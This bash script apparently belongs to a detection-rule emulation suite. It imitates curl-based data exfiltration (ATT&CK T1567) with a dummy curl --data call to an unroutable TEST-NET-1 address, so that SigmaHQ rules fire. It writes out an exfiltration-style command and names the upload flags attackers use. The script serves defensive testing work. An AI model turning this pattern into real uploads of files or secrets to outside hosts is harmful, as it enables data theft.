#!/usr/bin/env bash
# sigmahq_curl_fileupload.sh - benign SigmaHQ emulation (see sigmahq_nohup.sh header).
#
# What an attacker does: exfiltrate data with curl (T1567) via '--data' / '-F' /
# '--upload-file'. Harmless analogue: curl '--data' with a dummy value to a
# TEST-NET-1 address (192.0.2.0/24, RFC 5737, unroutable), 1s connect timeout,
# so nothing is ever sent. The target is not localhost, so the rule's localhost
# filter does not apply. curl_usage (any curl) fires alongside - a legit twin.
#
# Imitates (SigmaHQ): proc_creation_lnx_susp_curl_fileupload.yml - ATT&CK T1567
# Expected rules: proc_creation_lnx_susp_curl_fileupload, proc_creation_lnx_curl_usage
set -u

command -v curl >/dev/null 2>&1 || { echo "BANKEN-EMUL-SKIP: no curl"; exit 0; }

curl --data banken-emul --connect-timeout 1 http://192.0.2.1/ >/dev/null 2>&1 || true

exit 0
